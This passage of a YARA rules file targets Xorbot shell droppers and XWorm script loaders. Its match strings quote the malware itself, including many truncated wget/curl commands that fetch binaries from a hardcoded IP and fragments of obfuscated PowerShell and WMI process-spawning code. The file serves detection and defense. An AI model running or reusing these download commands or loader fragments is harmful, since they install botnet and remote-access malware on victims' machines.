      hash1 = "cb9759f6a86dc952a99cbf140162f88c7546148dbea355ac5e9744d6bd5ac7fe"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/jTc6a3qP5JeEl7AkfzABgJzdiizWzfzKsp; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/o0WIqBRyHnbNjphNckGAPJ7WcBd9jnUfwU; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/AYbRZdhouSP0i2dOZM9pBdwG465YBeIiVp; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/oolhKmu65BJPrUxezuCymScbiXzX7lSwVe; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Q26q9BinHX4RfKqR5MYJGHaDgsRxRUuUZz; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/UVceTJtMG8B7apI80J8pRrusEGir0AtKa3; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/ZA3LVg4HzVE4EPI7ItD7B3zXVsjit7iF3i; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/QM8kcfxuQ8RVz3bWzF2YTU1xhrE9yqsOZj; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/VaAMKfLFoDI0xhAbesHHA5aR8Y0EJ3YkOq; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/3r23NtuMbHou1oKcNtj6482yArhkdTcxxM; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/z77AANMOVfvcgH5orIygXfGk46dMR4Ww0v; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/GcLHn9KEorq4ZmpiU65Ml5V0q7eDRMibq1; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/syZYYSDfrODxkp4aVQe5ZSdCr1BZBsDbEP; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/quu2d2LWEufVjJuXZy6FTCw2N1QEEa8dpy; curl -" ascii /* score: '30.00'*/
      $s15 = "wget http://178.16.54.252/bins/oolhKmu65BJPrUxezuCymScbiXzX7lSwVe; curl -O  http://178.16.54.252/bins/oolhKmu65BJPrUxezuCymScbiX" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__e287e509 {
   meta:
      description = "_subset_batch - file Xorbot(signature)_e287e509.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e287e5093f60c40e6e159ff2101af07a112f3269b1197ff2f0c6ab9ed2a8721c"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/yRYb4iHDHrD0XgW8YoSMhXiNB9r9cFA1JM; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/mfjPmkjbBFXOD0AGjebrsmlBS1ah0m03qt; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/2HQFKEO7XlwfSTZUa9FXiIEAMIa6PDEM8l; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Oad99oAVZrmEIweuK56Q6JTR1iiG3qSaol; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/FTxqNOoIDlBcP1jJz4BloBUs5SZPVJ4ZUc; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/iOO646VsVNtpn5rprThWdElalcoKRAs1CE; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/eFgh6XkZO0CknvK6b4KVeWS3btvgvD4hpA; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/gKGGTzR0cueUWfExUoT8UVCOB46l01iToo; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/0QdF3csKwuw9cUQ9vsUdeemL1ePPEk2VYA; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/SyzF9hi2HaxiNoBSDxRNH9XEqGB95p8eVc; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/sdMFXnG36KZ131xvh25Y7OuiHATXl60n5g; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/fgET0mEa6rZvbDTRmJSAEgbdoNSF1KcrNY; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/YaHpoPo0xzXDxMhlFUXjupsltn5qaJh6jT; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/YaHpoPo0xzXDxMhlFUXjupsltn5qaJh6jT; curl -" ascii /* score: '27.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/mfjPmkjbBFXOD0AGjebrsmlBS1ah0m03qt; curl -" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__ef1e3e5b {
   meta:
      description = "_subset_batch - file Xorbot(signature)_ef1e3e5b.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ef1e3e5b105212307dda1ef228a4494b446f70a40ceef1b1aa6096fba921894e"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/hF548IdWvT7kXeSrzgVUSM1GK9cqGKhi1O; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/oJTKEHHfjlBwhr0wKEKO1l56aUd3Uc30Ta; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/FE0walDXp2gdmuCUgIUgxzWUgYctwCKegt; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/PLQ7PCXibcpS2frycRD6QZl8eAScLECbHi; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/4uAAowmz56sVlEbLLIVIWy4ly78olwO04N; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/ckZwvjP59ZlXcskBJtqL9spsbuJjQqIBDn; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Q1GXpftsDNh8j5RHBALwbzquzAfVRRNnmK; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/dgc9gMLFBUq1xDAJD7GQSwB7dqoOHg5ZdK; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/4XGHCy6I55FmWeuln2rkbJkKI0wL25demn; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/qkDks8sGdTnzN0jVEGiJ8c7YMrG1ojee0f; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/XUOY3utd54Hj6YIl6nxktPj1SOFZwo6GfF; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/7FBbZu4AgmUNminQr0vgKdOXJusNNuOZAv; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/oJTKEHHfjlBwhr0wKEKO1l56aUd3Uc30Ta; curl -" ascii /* score: '27.00'*/
      $s14 = "wget http://178.16.54.252/bins/XUOY3utd54Hj6YIl6nxktPj1SOFZwo6GfF; curl -O  http://178.16.54.252/bins/XUOY3utd54Hj6YIl6nxktPj1SO" ascii /* score: '27.00'*/
      $s15 = "wget http://178.16.54.252/bins/4uAAowmz56sVlEbLLIVIWy4ly78olwO04N; curl -O  http://178.16.54.252/bins/4uAAowmz56sVlEbLLIVIWy4ly7" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__f6aacb36 {
   meta:
      description = "_subset_batch - file Xorbot(signature)_f6aacb36.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f6aacb36fb1de1987699394159eadb435d9d099f29efb6b0f7dfcae4cdc94d7d"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/OC6rc60oJxFEyEmY9uOadiLxKSXOkGcOnQ; curl -" ascii /* score: '35.00'*/
      $x2 = "wget http://178.16.54.252/bins/OC6rc60oJxFEyEmY9uOadiLxKSXOkGcOnQ; curl -O  http://178.16.54.252/bins/OC6rc60oJxFEyEmY9uOadiLxKS" ascii /* score: '32.00'*/
      $x3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/OC6rc60oJxFEyEmY9uOadiLxKSXOkGcOnQ; curl -" ascii /* score: '32.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/2lg9OzuwgT9DdE0W2ehI8CiwBtcv8g9kml; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/s2wLpLE27KTM9EeDFjdbpgYSJ7FNBzGFR9; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/i6ezxplkK3JmXJNnLfqfQeze76p5Xb3eVK; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/oEQbGJqwA9366Iedtld8AqlxPcM6P3w67M; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/XQov3qmhrRtHSygY6mdb3XR8ANoxUtzvc4; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/sCivmt2lBQFBqbOPrT26WfvMSF4C8Fxz9x; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/8weenTAAasWqpseGnUH6JIWEsoULRDGoA8; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/EoVsfxDWwt74Dp4jLmq4rtswfnE7aQ0foD; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/e1omrAn93jTRdpkcb0TMcpJFLFymXIiCo3; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/uZ583b1WZoPUC4QuaoiZ960qIaXoi0Pkae; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/YqryAi9LTO9olaXrdx0FzS15oa94BvbBi5; curl -" ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/9Jtxd3U9jjecLDBtrW0sMakZYKLhiubguL; curl -" ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__3 {
   meta:
      description = "_subset_batch - file XWorm(signature).js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c6640775e1f0ee2ce0bf3ff5435e73ba35ee2618f1c5e1e70ccaae2edd4cdbb2"
   strings:
      $s1 = "        var outswings = teemed.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '21.00'*/
      $s2 = "        return teemed.Get(\"Win32_Process\");" fullword ascii /* score: '18.00'*/
      $s3 = "        return misgoverned.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '14.00'*/
      $s4 = "g(\\'' + spaded + '\\'" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 100KB and
      all of them
}

rule XWorm_signature__163869d6 {
   meta:
      description = "_subset_batch - file XWorm(signature)_163869d6.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "163869d635602f04bf9a2f1cfa38f95b70510ad4f3b8152eddf8dbef6330901c"
   strings:
      $s1 = "        var condylope = obituaries.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '21.00'*/
      $s2 = "        return obituaries.Get(\"Win32_Process\");" fullword ascii /* score: '18.00'*/
      $s3 = "        return absterged.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 200KB and
      all of them
}

rule XWorm_signature__9dc303c9 {
   meta:
      description = "_subset_batch - file XWorm(signature)_9dc303c9.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9dc303c9a5393b08a1b21e03ea97067b80ea19a709c24f9c6d2b3a00cdfe9158"
   strings:
      $s1 = "    var arulo = Parthenocissus.Get(\"Win32_Process\");" fullword ascii /* score: '18.00'*/
      $s2 = "    var carpetmonger = Parthenocissus.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '17.00'*/
      $s3 = "    var boniface = acylated.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '14.00'*/
      $s4 = "Yg('\" + achilary + \"'" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 100KB and
      all of them
}

rule XWorm_signature__9ea2f76d {
   meta:
      description = "_subset_batch - file XWorm(signature)_9ea2f76d.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9ea2f76d230550dc6bbb7384d58a46c8b93a7fdff496b3da786dd93d9f7fa17c"
   strings:
      $s1 = "        var angiostomatous = overexpress.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '21.00'*/
      $s2 = "        return overexpress.Get(\"Win32_Process\");" fullword ascii /* score: '18.00'*/
      $s3 = "        return smirker.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '14.00'*/
      $s4 = "g(\\'' + gorgonacea + '\\'" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 200KB and
      all of them
}

rule XWorm_signature__fc9cbd9f {
   meta:
      description = "_subset_batch - file XWorm(signature)_fc9cbd9f.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fc9cbd9f3ff909f828be4a11cc0f450f7acb6ed37ebdfb100fba27541d45b263"
   strings:
      $s1 = "        var unfussier = pedagogues.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '21.00'*/
      $s2 = "        return pedagogues.Get(\"Win32_Process\");" fullword ascii /* score: '18.00'*/
      $s3 = "nsOalsatianskalsatiansxalsatiansvalsatiansYalsatiansWalsatiansQalsatiansoalsatiansWalsatians0alsatiansNalsatiansvalsatiansbalsat" ascii /* score: '11.00'*/
      $s4 = "iansFalsatiansValsatianszalsatiansZalsatiansXalsatiansJalsatianszalsatiansXalsatiansFalsatiansBalsatians1alsatiansYalsatiansmals" ascii /* score: '11.00'*/
      $s5 = "atians1alsatiansialsatiansbalsatiansHalsatianskalsatiansgalsatiansPalsatiansSalsatiansBalsatiansbalsatiansUalsatiansmalsatiansVa" ascii /* score: '11.00'*/
      $s6 = "lsatiansjalsatiansaalsatiansTalsatianslalsatians5alsatiansYalsatians2alsatianstalsatiansGalsatiansMalsatiansmalsatiansJalsatians" ascii /* score: '11.00'*/
      $s7 = "atiansoalsatiansyalsatiansWalsatiansnalsatiansValsatianssalsatiansMalsatiansmalsatiansFalsatiansoalsatiansValsatiansmalsatians1a" ascii /* score: '11.00'*/
      $s8 = "palsatiansbalsatiansWalsatianslalsatians6alsatiansZalsatiansWalsatiansRalsatiansfalsatiansTalsatiansValsatiansNalsatiansJalsatia" ascii /* score: '11.00'*/
      $s9 = "lsatianslalsatiansealsatiansHalsatiansQalsatiansualsatiansRalsatiansWalsatians5alsatiansjalsatiansbalsatians2alsatiansRalsatians" ascii /* score: '11.00'*/
      $s10 = "nsValsatiansGalsatiansFalsatianszalsatiansaalsatians1alsatians9alsatiansOalsatiansYalsatiansWalsatians1alsatianslalsatiansJalsat" ascii /* score: '11.00'*/
      $s11 = "atians9alsatianstalsatiansQalsatiansmalsatiansFalsatianszalsatiansZalsatiansTalsatiansYalsatians0alsatiansUalsatians3alsatiansRa" ascii /* score: '11.00'*/
      $s12 = "ians1alsatianssalsatiansxalsatiansXalsatiansTalsatianssalsatianskalsatiansYalsatiansXalsatiansNalsatianszalsatiansZalsatiansWals" ascii /* score: '11.00'*/
      $s13 = "nalsatiansKalsatiansTalsatianssalsatianskalsatiansdalsatiansmalsatiansFalsatianssalsatiansbalsatians3alsatiansIalsatiansgalsatia" ascii /* score: '11.00'*/
      $s14 = "ialsatiansbalsatiansHalsatianskalsatiansualsatiansRalsatians2alsatiansValsatians0alsatiansValsatiansHalsatianslalsatianswalsatia" ascii /* score: '11.00'*/
      $s15 = "lalsatiansLalsatianskalsatiansdalsatianslalsatiansdalsatiansEalsatians1alsatianslalsatiansdalsatiansGalsatianshalsatiansvalsatia" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 40KB and
      8 of them
}

rule XWorm_signature__c9145fb5 {
   meta:
      description = "_subset_batch - file XWorm(signature)_c9145fb5.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c9145fb513e3753a527a2178013ba9eb5cf4414018221b7661ab31bad62d5ab6"
   strings:
      $s1 = "PowerShell.exe \"$dyNRIXIgIzkhITQjIy4hITEjIzUhITkjLiEhMSMjMSEhMy;$ROOMS='UJDYFNDHSINSHYEXHJPJAQRNFLSXAWJ';FUNCTION KLOO {&$NEXT " ascii /* score: '19.00'*/
      $s2 = "PowerShell.exe \"$dyNRIXIgIzkhITQjIy4hITEjIzUhITkjLiEhMSMjMSEhMy;$ROOMS='UJDYFNDHSINSHYEXHJPJAQRNFLSXAWJ';FUNCTION KLOO {&$NEXT " ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x6f50 and filesize < 1KB and
      all of them
}

rule XWorm_signature__4 {
   meta:
      description = "_subset_batch - file XWorm(signature).vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0c6136455852d2b3a284d1c4f3a5a4b0e01895080ce72e92fc531b04b2580fbe"
   strings:
      $s1 = "Set pucelle = consiglieri.Get(\"Win32_ProcessStartup\").SpawnInstance_" fullword ascii /* score: '26.00'*/
      $s2 = "Set iconographical = consiglieri.Get(\"Win32_Process\")" fullword ascii /* score: '19.00'*/
      $s3 = "groundward = nonbasalt.GetParentFolderName(WScript.ScriptFullName)" fullword ascii /* score: '19.00'*/
      $s4 = "fairtrade  = \"nondistorterspnondistortersownondistortersenondistortersrshell -NnondistortersonondistortersPrnondistortersofnond" ascii /* score: '13.00'*/
      $s5 = "fairtrade  = \"nondistorterspnondistortersownondistortersenondistortersrshell -NnondistortersonondistortersPrnondistortersofnond" ascii /* score: '13.00'*/
      $s6 = "Set consiglieri = GetObject(\"winmgmts:root\\cimv2\")" fullword ascii /* score: '12.00'*/
      $s7 = "acrimationsSlacrimationsWlacrimations5lacrimations2lacrimationsblacrimations2lacrimationstlacrimationsllacrimationsKlacrimations" ascii /* score: '11.00'*/
      $s8 = "sVlacrimationsjlacrimationsdlacrimationsGlacrimationsllacrimationsvlacrimationsblacrimationsilacrimations5lacrimationsBlacrimati" ascii /* score: '11.00'*/
      $s9 = "onsblacrimationsWlacrimationsllacrimations6lacrimationsZlacrimationsWlacrimationsRlacrimationsflacrimationsTlacrimationsVlacrima" ascii /* score: '11.00'*/
      $s10 = "imationsClacrimationsdlacrimationsDlacrimationsOlacrimationsllacrimationsxlacrimationsVlacrimationsclacrimations2lacrimationsVla" ascii /* score: '11.00'*/
      $s11 = "acrimationsclacrimations3lacrimationsRlacrimationshlacrimationsclacrimationsnlacrimationsRlacrimations1lacrimationsclacrimations" ascii /* score: '11.00'*/
      $s12 = "crimationsylacrimationselacrimationsTlacrimationsElacrimationsulacrimationsSlacrimationsGlacrimations9lacrimationstlacrimationsZ" ascii /* score: '11.00'*/
      $s13 = "imations1lacrimationsslacrimationsxlacrimationsXlacrimationsTlacrimationsslacrimationsklacrimationsYlacrimationsXlacrimationsNla" ascii /* score: '11.00'*/
      $s14 = "mationsblacrimationsClacrimationsAlacrimations9lacrimationsIlacrimationsClacrimationsglacrimationsklacrimationsdlacrimations2lac" ascii /* score: '11.00'*/
      $s15 = "rimationsRlacrimationsdlacrimationsOlacrimationsjlacrimationsplacrimationsGlacrimationsclacrimationsmlacrimations9lacrimationstl" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x6553 and filesize < 40KB and
      8 of them
}

rule XWorm_signature__39a2542f {
   meta:
      description = "_subset_batch - file XWorm(signature)_39a2542f.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "39a2542ffacc8c7d962581304c5e59aac7d2efe97d840edaf4fbe85cf8d1182b"
   strings:
      $s1 = "Set prase = nonintrinsic.Get(\"Win32_ProcessStartup\").SpawnInstance_" fullword ascii /* score: '26.00'*/
      $s2 = "lampetra = tetraphene.GetParentFolderName(WScript.ScriptFullName)" fullword ascii /* score: '19.00'*/
      $s3 = "Set interiorscapes = nonintrinsic.Get(\"Win32_Process\")" fullword ascii /* score: '19.00'*/
      $s4 = "colortype  = \"hauteurphauteurowhauteurehauteurrshell -NhauteurohauteurPrhauteurofhauteurihauteurlhauteure -Whauteurinhauteurdha" ascii /* score: '13.00'*/
      $s5 = "colortype  = \"hauteurphauteurowhauteurehauteurrshell -NhauteurohauteurPrhauteurofhauteurihauteurlhauteure -Whauteurinhauteurdha" ascii /* score: '13.00'*/
      $s6 = "Set nonintrinsic = GetObject(\"winmgmts:root\\cimv2\")" fullword ascii /* score: '12.00'*/
      $s7 = "lidatorZvalidatorjvalidatorlvalidatortvalidatorZvalidatorHvalidatorBvalidatorWvalidatorWvalidatorGvalidatorNvalidator5validatorR" ascii /* score: '11.00'*/
      $s8 = "datorkvalidatorXvalidator2validator1validatorzvalidatoravalidatorVvalidator8validatoryvalidatorMvalidatorDvalidatorIvalidator1va" ascii /* score: '11.00'*/
      $s9 = "rnvalidatorBvalidatoruvalidatorZvalidatoryvalidatorcvalidatorpvalidatorIvalidatorCvalidator1validatortvalidatorYvalidatorXvalida" ascii /* score: '11.00'*/
      $s10 = "rGvalidator9validator3validatorbvalidatormvalidatorxvalidatorvvalidatorYvalidatorWvalidatorRvalidatorzvalidatorXvalidatorCvalida" ascii /* score: '11.00'*/
      $s11 = "lidatorPvalidatorSvalidatorAvalidatorkvalidatorYvalidatorXvalidatorNvalidatorzvalidatorZvalidatorWvalidator1validatorivalidatorb" ascii /* score: '11.00'*/
      $s12 = "torRvalidator1validatorcvalidatorFvalidator9validatorvvalidatorbvalidatornvalidatorNvalidator0validatorYvalidatorXvalidatorJvali" ascii /* score: '11.00'*/
      $s13 = "rWvalidator5validator0validatorOvalidatoryvalidatorAvalidatorkvalidatordvalidator2validatorMvalidatoruvalidatorRvalidatorWvalida" ascii /* score: '11.00'*/
      $s14 = "validatorVvalidator9validatorGvalidatoravalidatorWvalidatorxvalidatorlvalidatorJvalidatoryvalidatorwvalidatornvalidatorTvalidato" ascii /* score: '11.00'*/
      $s15 = "datorpvalidatorYvalidator1validatorxvalidatorEvalidatorbvalidator3validatordvalidatoruvalidatorbvalidatorGvalidator9validatorhva" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x6553 and filesize < 30KB and
      8 of them
}

rule XWorm_signature__7fcaf4c4 {
   meta:
      description = "_subset_batch - file XWorm(signature)_7fcaf4c4.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7fcaf4c4989ecd0238f93b66b6f3be5042116971b565cec40556e7f7c0f9d6bb"
   strings:
      $s1 = "Set ligation = terrains.Get(\"Win32_ProcessStartup\").SpawnInstance_" fullword ascii /* score: '26.00'*/
      $s2 = "Set semimartingales = terrains.Get(\"Win32_Process\")" fullword ascii /* score: '23.00'*/
      $s3 = "thermalising = funerally.GetParentFolderName(WScript.ScriptFullName)" fullword ascii /* score: '19.00'*/
      $s4 = "blipped  = \"expediterspexpeditersowexpediterseexpeditersrshell -NexpeditersoexpeditersPrexpeditersofexpeditersiexpediterslexped" ascii /* score: '13.00'*/
      $s5 = "blipped  = \"expediterspexpeditersowexpediterseexpeditersrshell -NexpeditersoexpeditersPrexpeditersofexpeditersiexpediterslexped" ascii /* score: '13.00'*/
      $s6 = "Set terrains = GetObject(\"winmgmts:root\\cimv2\")" fullword ascii /* score: '12.00'*/
      $s7 = "AnnieAAnnienAnniePAnnieTAnnie1AnnieBAnnieZAnnieDAnnieRAnnieSAnniebAnniekAnniexAnnievAnnieUAnniemAnnie5AnniejAnniedAnnielAnnieoAn" ascii /* score: '11.00'*/
      $s8 = "eTAnniemAnnieFAnnietAnnieZAnnieVAnnie9AnnieGAnnieaAnnieWAnniexAnnielAnnieJAnnieyAnniewAnnienAnnieQAnnieWAnnieRAnniekAnnieSAnnieW" ascii /* score: '11.00'*/
      $s9 = "niebAnnieUAnnie3AnnielAnniezAnniedAnnieGAnnieVAnnietAnnieLAnnielAnnieRAnnielAnnieeAnnieHAnnieQAnnieuAnnieRAnnieWAnnie5AnniejAnni" ascii /* score: '11.00'*/
      $s10 = "eMAnniemAnnieJAnniezAnnieQAnnielAnniehAnniekAnniedAnniejAnnieAAnnieyAnnieYAnniemAnnieoAnnie1AnnieUAnnie1AnniepAnnievAnnieTAnniel" ascii /* score: '11.00'*/
      $s11 = "AnnieBAnnie1AnnieYAnniemAnniexAnniepAnnieYAnnie1AnniexAnnieEAnniebAnnie3AnniedAnnieuAnniebAnnieGAnnie9AnniehAnnieZAnnieHAnnieNAn" ascii /* score: '11.00'*/
      $s12 = "eZAnnieWAnnie1AnnieiAnniebAnnieHAnniekAnnieuAnnieRAnnie2AnnieVAnnie0AnnieVAnnieHAnnielAnniewAnnieZAnnieSAnniegAnnienAnnieQAnnie2" ascii /* score: '11.00'*/
      $s13 = "ebAnniemAnnieQAnnienAnnieKAnnieTAnniesAnniekAnniedAnniemAnnieFAnniesAnniebAnnie3AnnieIAnniegAnniePAnnieSAnnieAAnniekAnniebAnnieW" ascii /* score: '11.00'*/
      $s14 = "ebAnnie2AnnieRAnniepAnniebAnniemAnniedAnniedAnnieOAnniejAnniepAnnieVAnnieVAnnieEAnnieYAnnie4AnnieOAnnieyAnnieAAnniekAnniebAnnien" ascii /* score: '11.00'*/
      $s15 = "Annie9Annie3AnniebAnniemAnniexAnnievAnnieYAnnieWAnnieQAnnievAnniebAnnie3AnnieBAnnie0AnnieaAnnieWAnnie1AnniepAnnieeAnniemAnnieVAn" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x6553 and filesize < 20KB and
      8 of them
}

rule XWorm_signature__5 {
   meta:
      description = "_subset_batch - file XWorm(signature).wsf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
